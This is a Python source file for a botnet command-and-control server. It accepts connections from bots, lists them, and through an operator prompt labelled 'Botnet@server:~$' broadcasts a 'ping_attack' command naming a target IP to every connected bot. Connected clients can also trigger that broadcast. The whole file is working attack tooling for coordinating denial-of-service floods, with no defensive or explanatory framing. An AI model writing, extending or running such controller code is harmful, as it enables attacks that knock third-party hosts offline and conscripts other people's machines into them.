import socket
import threading

class Server:
    def __init__(self, host='192.168.1.50', port=11111):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connections = []
        self.lock = threading.Lock()

    def start(self):
        try:
            self.sock.bind((self.host, self.port))
        except OSError as e:
            print(f"Error: {e}")
            return

        self.sock.listen(5)
        print(f"Server listening on {self.host}:{self.port}")

        # Iniciar el subproceso para manejar la entrada del usuario
        threading.Thread(target=self.user_input_loop, daemon=True).start()

        while True:
            conn, addr = self.sock.accept()
            self.add_connection(conn)
            client_handler = threading.Thread(target=self.handle_client, args=(conn, addr))
            client_handler.start()

    def add_connection(self, conn):
        with self.lock:
            self.connections.append(conn)

    def remove_connection(self, conn):
        with self.lock:
            self.connections.remove(conn)

    def handle_client(self, conn, addr):
        try:
            while True:
                command = conn.recv(1024).decode().strip()
                if not command:
                    break
                if command.lower() == "exit":
                    print("Closing server...")
                    break
                elif command.lower() == "bots_connecteds":
                    self.display_connected_bots()
                elif command.lower().startswith("ping_attack "):
                    target_ip = command.split(" ", 1)[1]
                    print(f"Received ping attack command for {target_ip} from {addr}. Initiating attack...")
                    self.ping_attack(target_ip)
                else:
                    print("Invalid command")
        except ConnectionResetError:
            print(f"Connection with client {addr} reset unexpectedly.")
        finally:
            self.remove_connection(conn)
            conn.close()

    def user_input_loop(self):
        while True:
            command = input("Botnet@server:~$ ").strip()
            if command.lower() == "exit":
                print("Closing server...")
                for conn in self.connections:
                    conn.close()
                self.sock.close()
                break
            elif command.lower() == "bots_connecteds":
                self.display_connected_bots()
            elif command.lower().startswith("ping_attack "):
                target_ip = command.split(" ", 1)[1]
                print(f"Initiating ping attack to {target_ip}...")
                self.ping_attack(target_ip)
            else:
                print("Invalid command")

    def display_connected_bots(self):
        print("Bots Connected:")
        with self.lock:
            for i, connection in enumerate(self.connections):
                print(f"Bot {i+1}: {connection.getpeername()}")

    def ping_attack(self, target_ip):
        print(f"Initiating ping attack to {target_ip}...")
        with self.lock:
            for conn in self.connections:
                conn.send(f"ping_attack {target_ip}".encode())
        print("Ping attack initiated.")

if __name__ == "__main__":
    server = Server()
    server.start()